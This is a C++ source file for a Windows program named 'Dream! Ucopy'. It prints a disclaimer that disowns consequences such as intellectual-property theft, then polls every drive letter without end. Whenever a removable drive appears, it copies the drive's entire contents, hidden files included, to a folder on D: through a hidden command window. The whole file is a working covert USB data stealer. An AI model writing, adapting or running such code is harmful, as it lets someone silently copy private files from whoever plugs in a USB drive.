#include <Windows.h>
#include <Tchar.h>
#include <iostream>

int main() {
	std::cout << "Dream! Ucopy 已启动 以下为免责声明" << std::endl;
	std::cout << "在某些地区或某些情况下 Dream! Ucopy（后文简称 本软件）不合法或不合规范\n请根据你所在的地区法律决定使用权\n所有因本软件导致的后果包含财产损失，知识产权盗取或其他后果与软件开发者无关\n " << std::endl;
	std::cout << "If you do not understand the above disclaimer or the operation effect of the software, please close the software immediately.\nThe shortcut key for exiting is: Ctrl + C\n" << std::endl;
	std::cout << "dream! Ucopy 作者：Nicktang \nDream!是由Nicktang制作的软件合集（开发代号：Greynet）创立于2021年12月\nCopyright : Nicktang 2022" << std::endl;
	int APIENTRY wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int);
	{
		WCHAR diskPath[] = { 'A',':','\0' }, instr[MAX_PATH]{ '\0' };
		for (DWORD diskInf; *diskPath < 'Z' + 1; (*diskPath == 'Z' ? *diskPath = 'A' : ++ * diskPath))
		{
			if (GetDriveType(diskPath) == DRIVE_REMOVABLE && GetVolumeInformation(diskPath, 0, 0, &diskInf, 0, 0, 0, 0))
			{
				_stprintf_s(instr, MAX_PATH, L"/c xcopy %lc:\\ D:\\dream\\%10u\\ /e /f /s /y /d /c /h", *diskPath, diskInf);
				SHELLEXECUTEINFO sei = { sizeof(sei) };
				sei.lpFile = L"cmd";
				sei.lpParameters = instr;
				sei.nShow = SW_HIDE;
				if (ShellExecuteEx(&sei) && sei.hProcess)WaitForSingleObject(sei.hProcess, INFINITE);
			}
			Sleep(500);
		}
	}
}
